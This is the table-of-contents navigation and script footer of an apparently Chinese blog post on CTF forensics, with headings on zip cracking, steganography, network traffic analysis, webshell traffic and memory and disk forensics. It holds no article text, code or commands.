class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E6%89%80%E6%9C%89%E7%9A%84%E6%98%8E%E6%96%87%E6%88%96%E4%B8%89%E6%AE%B5%E5%AF%86%E9%92%A5"><span class="nav-text">已知所有的明文或三段密钥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E9%83%A8%E5%88%86%E6%98%8E%E6%96%87"><span class="nav-text">已知部分明文</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%AE%80%E5%8D%95%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%87%E6%9C%AC%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3"><span class="nav-text">1)简单的加密文本压缩包破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8PNG%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4%E7%A0%B4%E8%A7%A3"><span class="nav-text">2)利用PNG图片文件头破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">3)利用压缩包格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-EXE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">4)EXE文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E6%B5%81%E9%87%8F%E5%8C%85pcapng%E6%A0%BC%E5%BC%8F%E8%A7%A3%E5%AF%86"><span class="nav-text">5)流量包pcapng格式解密</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E7%BD%91%E7%AB%99%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="nav-text">6)网站相关文件破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-SVG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">7)SVG文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-VMDK%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">8)VMDK文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95"><span class="nav-text">在比赛中的使用记录</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E7%88%86%E7%A0%B4%E6%97%B6%E6%B3%A8%E6%84%8F%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6"><span class="nav-text">暴力破解(爆破时注意限制长度)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9E%E7%8E%AF%E5%A5%97%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">连环套压缩包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E7%9F%A5%E5%90%8E%E7%BC%80%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">未知后缀的压缩包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E5%8D%B7%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%88%E5%B9%B6"><span class="nav-text">分卷压缩包合并</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%82%B8%E5%BC%B9"><span class="nav-text">压缩包炸弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE010%E4%B8%AD%E7%9A%84%E6%A8%A1%E6%9D%BF%E4%BF%AE%E6%94%B9%E4%BA%86%E6%9F%90%E4%BA%9B%E5%8F%82%E6%95%B0"><span class="nav-text">根据010中的模板修改了某些参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E6%98%AF%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-text">压缩包密码是不可见字符</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E6%95%B0%E5%BE%88%E7%9F%AD%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">字节数很短的情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E6%95%B0%E8%BE%83%E9%95%BF%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">字节数较长的情况</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PDF%E9%9A%90%E5%86%99"><span class="nav-text">PDF隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MS-Office%E9%9A%90%E5%86%99"><span class="nav-text">MS-Office隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Excel%E6%96%87%E4%BB%B6%EF%BC%9A-xls-xlsx"><span class="nav-text">Excel文件：.xls .xlsx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Word%E6%96%87%E4%BB%B6%EF%BC%9A-doc-docx"><span class="nav-text">Word文件：.doc .docx</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TXT%E6%96%87%E6%9C%AC%E9%9A%90%E5%86%99"><span class="nav-text">TXT文本隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML%E9%9A%90%E5%86%99"><span class="nav-text">HTML隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WireShark%E5%9F%BA%E7%A1%80"><span class="nav-text">WireShark基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tshark%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="nav-text">tshark使用教程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E8%80%83%E7%82%B9"><span class="nav-text">流量分析基础考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">USB流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">键盘流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BC%A0%E6%A0%87%E6%B5%81%E9%87%8F"><span class="nav-text">鼠标流量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E4%BD%8D%E6%9D%BF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-text">数位板流量分析：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">SQL注入流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">Webshell流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">菜刀流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">哥斯拉流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">冰蝎流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">蚁剑流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CobalStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">CobalStrike流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">NTLM流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88SMB%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（SMB协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88HTTP%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（HTTP协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88SMTP%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（SMTP协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0RDP%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">本地RDP流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">工控流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Modbus-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">Modbus 协议分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Modbus-RTU"><span class="nav-text">Modbus&#x2F;RTU</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-HNGK-Modbus%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">例题1 HNGK-Modbus流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#S7comm-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">S7comm 协议分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-2020ICSC%E6%B9%96%E5%B7%9E%E7%AB%99%E2%80%94%E5%B7%A5%E6%8E%A7%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="nav-text">例题1 2020ICSC湖州站—工控协议数据分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%93%9D%E7%89%99-OBEX-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">蓝牙(OBEX)流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6-STMP-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">邮件(STMP)流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">无线流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SLL%E3%80%81TLS%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">SLL、TLS加密流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PFX%E8%AF%81%E4%B9%A6%E5%AF%BC%E5%85%A5"><span class="nav-text">PFX证书导入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MMTLS-%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE"><span class="nav-text">MMTLS - 微信安全通信协议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VPN%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">VPN流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Shadowsocks%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">Shadowsocks流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#VMess-V2ray-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">VMess(V2ray)流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ADS-B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">ADS-B流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8D%9F%E5%9D%8F%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-text">损坏的流量包分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%AD%E6%89%BE%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F"><span class="nav-text">从流量包中找异常流量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">Windows内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3"><span class="nav-text">Volatility3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">Linux内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C-Profile-Vol2-%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-text">制作  Profile(Vol2)  的详细过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C-symbols-Vol3-%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-text">制作  symbols(Vol3)  的详细过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2-2"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3-2"><span class="nav-text">Volatility3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MacOS%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">MacOS内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2-3"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3-3"><span class="nav-text">Volatility3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E4%B8%8D%E5%87%BA%E5%86%85%E5%AD%98%E9%95%9C%E5%83%8F%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%96%E8%AF%81"><span class="nav-text">识别不出内存镜像版本的取证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%9D%A5%E5%88%B6%E4%BD%9C%E5%86%85%E5%AD%98%E9%95%9C%E5%83%8F%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-text">用来制作内存镜像的工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dmp%E6%96%87%E4%BB%B6"><span class="nav-text">dmp文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dump%E6%96%87%E4%BB%B6"><span class="nav-text">dump文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mem%E6%96%87%E4%BB%B6"><span class="nav-text">mem文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#raw%E6%96%87%E4%BB%B6"><span class="nav-text">raw文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81"><span class="nav-text">磁盘取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#VeraCrypt"><span class="nav-text">VeraCrypt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%96%E8%AF%81%E5%A4%A7%E5%B8%88"><span class="nav-text">取证大师</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fat%E6%96%87%E4%BB%B6"><span class="nav-text">fat文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VMDK%E6%96%87%E4%BB%B6"><span class="nav-text">VMDK文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#E01%E6%96%87%E4%BB%B6"><span class="nav-text">E01文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ad1%E6%96%87%E4%BB%B6"><span class="nav-text">ad1文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VHD%E6%96%87%E4%BB%B6"><span class="nav-text">VHD文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="nav-text">磁盘取证的一些思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BPowershell%E7%9A%84%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="nav-text">查看Powershell的历史记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E5%8F%96%E8%AF%81"><span class="nav-text">仿真取证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81"><span class="nav-text">网站取证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81"><span class="nav-text">服务器取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql5-7-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8Eqp-xb%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE"><span class="nav-text">Mysql5.7 数据库从qp.xb文件恢复数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D"><span class="nav-text">1、磁盘恢复</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">2、浏览器登录凭证破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AE"><span class="nav-text">其他题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FAS%E6%96%87%E4%BB%B6"><span class="nav-text">FAS文件</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->

    
<script src="/js/lazyload.js"></script>



<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
